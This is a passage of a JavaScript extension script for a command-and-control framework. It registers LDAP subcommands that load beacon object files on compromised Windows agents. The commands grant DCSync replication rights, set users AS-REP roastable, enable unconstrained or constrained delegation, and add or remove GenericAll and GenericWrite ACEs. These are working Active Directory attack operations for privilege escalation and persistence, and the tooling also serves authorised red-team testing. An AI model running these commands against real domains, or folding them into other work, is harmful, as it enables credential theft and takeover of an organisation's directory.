_cmd_adddcsync.addArgFlagString("-inherit-guid", "inherit_guid", false, "Inherited object type GUID");
_cmd_adddcsync.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_adddcsync.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_adddcsync.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_adddcsync.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_target_dn = identifyInputType(target);
    let trustee = parsed_json["trustee"];
    let is_trustee_dn = identifyInputType(trustee);
    let rights = "DCSync";
    let ace_type = parsed_json["ace_type"] || "";
    let flags = parsed_json["flags"] || "";
    let guid = parsed_json["guid"] || "";
    let inherit_guid = parsed_json["inherit_guid"] || "";
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,cstr,cstr,cstr,cstr,cstr,int",
        [target, is_target_dn, trustee, is_trustee_dn, rights, ace_type, flags, guid, inherit_guid, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-ace." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Adding ACE to ${target}...`);
});



var _cmd_addasreproastable = ax.create_command(
    "add-asreproastable",
    "Make a user AS-REP roastable (set DONT_REQ_PREAUTH)",
    "ldap add-asreproastable jane.doe -dc dc01.domain.local"
);
_cmd_addasreproastable.addArgString("target", true, "Target user name or DN");
_cmd_addasreproastable.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_addasreproastable.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addasreproastable.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addasreproastable.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int", [target, is_dn, "DONT_REQ_PREAUTH", ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-uac." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Making ${target} AS-REP roastable...`);
});



var _cmd_addunconstrained = ax.create_command(
    "add-unconstrained",
    "Enable unconstrained delegation on an object",
    "ldap add-unconstrained machine01$ -ou \"OU=Computers,DC=domain,DC=local\" -dc dc01.domain.local"
);
_cmd_addunconstrained.addArgString("target", true, "Target object name or DN");
_cmd_addunconstrained.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_addunconstrained.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addunconstrained.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addunconstrained.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int", [target, is_dn, "TRUSTED_FOR_DELEGATION", ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-uac." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Enabling unconstrained delegation on ${target}...`);
});

var _cmd_addconstrained = ax.create_command(
    "add-constrained",
    "Set/replace delegation SPNs",
    "ldap add-constrained machine01$ RestrictedKrbHost/machine01.domain.local -dc dc01.domain.local"
);
_cmd_addconstrained.addArgString("target", true, "Object name or DN");
_cmd_addconstrained.addArgString("spn", true, "Delegation SPN (replaces all existing)");
_cmd_addconstrained.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_addconstrained.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_addconstrained.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_addconstrained.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let spn = parsed_json["spn"];
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int", [target, is_dn, spn, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/add-delegation." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Setting delegation on ${target}...`);
});



var _cmd_removedcsync = ax.create_command(
    "remove-dcsync",
    "Remove DCSync ACEs from an object's DACL",
    "ldap remove-dcsync DC=domain,DC=local jane.doe -dc dc01.domain.local"
);
_cmd_removedcsync.addArgString("target", true, "Target object name or DN");
_cmd_removedcsync.addArgString("trustee", true, "Trustee name or DN");
_cmd_removedcsync.addArgFlagString("-type","ace_type", false, "ACE type to match (optional: allow, deny)");
_cmd_removedcsync.addArgFlagInt("-index","ace_index", false, "ACE index to remove (use get-acl to find index)");
_cmd_removedcsync.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_removedcsync.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_removedcsync.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_removedcsync.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let trustee = parsed_json["trustee"];
    let is_trustee_dn = identifyInputType(trustee);
    let rights = "DCSync";
    let ace_type = parsed_json["ace_type"] || "";
    let ace_index = parsed_json["ace_index"] || -1;
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,int,cstr,cstr,int",
        [target, is_dn, trustee, is_trustee_dn, rights, ace_type, ace_index, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/remove-ace." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Removing DCSync from ${target}...`);
});



var _cmd_removegenericwrite = ax.create_command(
    "remove-genericwrite",
    "Remove a GenericWrite ACE from an object's DACL",
    "ldap remove-genericwrite cn=SomeObject,OU=Data,DC=domain,DC=local jane.doe -dc dc01.domain.local"
);
_cmd_removegenericwrite.addArgString("target", true, "Target object name or DN");
_cmd_removegenericwrite.addArgString("trustee", true, "Trustee name or DN");
_cmd_removegenericwrite.addArgFlagString("-type","ace_type", false, "ACE type to match (optional: allow, deny)");
_cmd_removegenericwrite.addArgFlagInt("-index","ace_index", false, "ACE index to remove (use get-acl to find index)");
_cmd_removegenericwrite.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_removegenericwrite.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_removegenericwrite.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_removegenericwrite.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let trustee = parsed_json["trustee"] || "";
    let is_trustee_dn = identifyInputType(trustee);
    let rights = "GenericWrite";
    let ace_type = parsed_json["ace_type"] || "";
    let ace_index = parsed_json["ace_index"] || -1;
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,int,cstr,cstr,int",
        [target, is_dn, trustee, is_trustee_dn, rights, ace_type, ace_index, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/remove-ace." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Removing GenericWrite from ${target}...`);
});



var _cmd_removegenericall= ax.create_command(
    "remove-genericall",
    "Remove a GenericAll ACE from an object's DACL",
    "ldap remove-genericall cn=SomeObject,OU=Data,DC=domain,DC=local jane.doe -dc dc01.domain.local"
);
_cmd_removegenericall.addArgString("target", true, "Target object name or DN");
_cmd_removegenericall.addArgString("trustee", true, "Trustee name or DN");
_cmd_removegenericall.addArgFlagString("-type","ace_type", false, "ACE type to match (optional: allow, deny)");
_cmd_removegenericall.addArgFlagInt("-index","ace_index", false, "ACE index to remove (use get-acl to find index)");
_cmd_removegenericall.addArgFlagString("-ou", "ou_path", false, "OU path to search");
_cmd_removegenericall.addArgFlagString("-dc", "dc_fqdn", false, "Domain Controller FQDN");
_cmd_removegenericall.addArgBool("--ldaps", "Use LDAPS (port 636)");
_cmd_removegenericall.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
    let target = parsed_json["target"];
    let is_dn = identifyInputType(target);
    let trustee = parsed_json["trustee"] || "";
    let is_trustee_dn = identifyInputType(trustee);
    let rights = "GenericAll";
    let ace_type = parsed_json["ace_type"] || "";
    let ace_index = parsed_json["ace_index"] || -1;
    let ou_path = parsed_json["ou_path"] || "";
    let dc_fqdn = parsed_json["dc_fqdn"] || "";
    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;

    let bof_params = ax.bof_pack("cstr,int,cstr,int,cstr,cstr,int,cstr,cstr,int",
        [target, is_dn, trustee, is_trustee_dn, rights, ace_type, ace_index, ou_path, dc_fqdn, use_ldaps]);
    let bof_path = ax.script_dir() + "_bin/LDAP/remove-ace." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `Removing GenericAll from ${target}...`);
});



var cmd_ldap = ax.create_command("ldap", "LDAP domain interactions (LDAP-BOF)");
cmd_ldap.addSubCommands([ _cmd_getacl, _cmd_getattribute, _cmd_getcomputers, _cmd_getgroups, _cmd_getgroupmembers, _cmd_getdelegation, _cmd_getdomaininfo, _cmd_getmaq,
                          _cmd_getobject, _cmd_getrbcd, _cmd_getspn, _cmd_getuac,  _cmd_getusers, _cmd_getusergroups, _cmd_getwritable ]);
cmd_ldap.addSubCommands([_cmd_moveobject]);
cmd_ldap.addSubCommands([_cmd_addace, _cmd_addattribute, _cmd_addcomputer, _cmd_adddelegation, _cmd_addgroup, _cmd_addgroupmember, _cmd_addou, _cmd_addrbcd,
                         _cmd_addsidhistory, _cmd_addspn, _cmd_adduser, _cmd_adduac ]);
cmd_ldap.addSubCommands([_cmd_addgenericall, _cmd_addgenericwrite, _cmd_adddcsync, _cmd_addasreproastable, _cmd_addunconstrained, _cmd_addconstrained, ]);
cmd_ldap.addSubCommands([_cmd_setattribute, _cmd_setdelegation, _cmd_setowner, _cmd_setspn, _cmd_setpassword, _cmd_setuac ]);
cmd_ldap.addSubCommands([_cmd_removeace, _cmd_removeattribute, _cmd_removedelegation, _cmd_removedcsync, _cmd_removegenericall, _cmd_removegenericwrite,
                         _cmd_removegroupmember, _cmd_removeobject, _cmd_removerbcd, _cmd_removespn, _cmd_removeuac, ]);


var group_ldap = ax.create_commands_group("LDAP-BOF", [cmd_ldap]);
ax.register_commands_group(group_ldap, ["beacon", "gopher", "kharon"], ["windows"], []);